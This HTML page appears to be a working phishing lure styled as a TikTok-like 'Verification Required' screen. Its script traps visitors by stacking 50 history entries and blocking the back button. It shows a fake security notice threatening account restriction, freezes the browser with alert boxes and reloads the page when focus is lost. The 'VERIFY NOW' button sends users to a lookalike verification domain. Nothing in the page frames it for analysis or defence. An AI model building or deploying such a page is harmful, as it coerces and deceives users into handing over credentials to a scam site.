<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        body, html { 
            margin: 0; padding: 0; width: 100%; height: 100%; 
            background: #ffffff; font-family: -apple-system, sans-serif;
            overflow: hidden;
        }
        
        #main-ui {
            display: flex; flex-direction: column; align-items: center; 
            justify-content: center; height: 100vh; text-align: center;
            z-index: 10; position: relative;
        }

        .verify-btn {
            background: #fe2c55; color: white; padding: 16px 60px; 
            border-radius: 4px; text-decoration: none; font-weight: 700;
            font-size: 18px; border: none; cursor: pointer;
            z-index: 100; position: relative;
        }

        /* THE SYSTEM FAKE-OUT */
        #fake-alert {
            display: none; position: fixed; top: 0; left: 0;
            width: 100%; height: 100%; background: rgba(0,0,0,0.6);
            z-index: 999999; justify-content: center; align-items: center;
        }

        .alert-box {
            background: white; width: 80%; border-radius: 12px;
            padding: 20px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }

        .alert-title { font-weight: 700; font-size: 18px; margin-bottom: 10px; }
        .alert-msg { font-size: 14px; color: #666; margin-bottom: 20px; }
        .alert-ok { color: #007aff; font-weight: 600; font-size: 17px; cursor: pointer; border-top: 1px solid #eee; padding-top: 15px; display: block; }
    </style>
</head>
<body>

    <div id="fake-alert">
        <div class="alert-box">
            <div class="alert-title">Security Notice</div>
            <div class="alert-msg">You must complete the verification process before exiting. Failure to do so may result in account restriction.</div>
            <div class="alert-ok" onclick="closeAlert()">OK</div>
        </div>
    </div>

    <div id="main-ui">
        <div style="font-size: 26px; font-weight: 800; margin-bottom: 10px;">Verification Required</div>
        <p style="color: #8a8b91; padding: 0 40px; margin-bottom: 40px;">Please tap the button below to confirm your identity and secure your session.</p>
        
        <button class="verify-btn" id="real-verify">VERIFY NOW</button>
    </div>

<script>
    let isVerifying = false;

    // 1. PRISON STACK
    function lockHistory() {
        for(let i=0; i<50; i++) {
            history.pushState({locked: true}, "", "#auth_" + i);
        }
    }

    // 2. THE SMART BLUR
    window.onblur = function() {
        // If they click the "X" button, they trigger a blur.
        // If they aren't currently clicking the 'Verify' button, we show the alert.
        if (!isVerifying) {
            showAlert();
            // Trigger the reload race condition in the background
            setTimeout(() => {
                location.replace(location.href);
            }, 2000); 
        }
    };

    function showAlert() {
        document.getElementById('fake-alert').style.display = 'flex';
        // We still use a real alert as a fallback because it freezes the app
        alert("Action Required: Please finish verification.");
    }

    function closeAlert() {
        document.getElementById('fake-alert').style.display = 'none';
    }

    // 3. THE VERIFICATION ESCAPE
    document.getElementById('real-verify').addEventListener('touchstart', () => {
        isVerifying = true; // Tell the script to stop blocking focus
    });

    document.getElementById('real-verify').onclick = () => {
        window.location.href = "https://tiktokverification.github.io/captcha/Verification/verify1.html";
    };

    // 4. BACK BUTTON PROTECTION
    window.onpopstate = function() {
        history.go(1);
        showAlert();
    };

    window.onload = lockHistory;
</script>
</body>
</html>
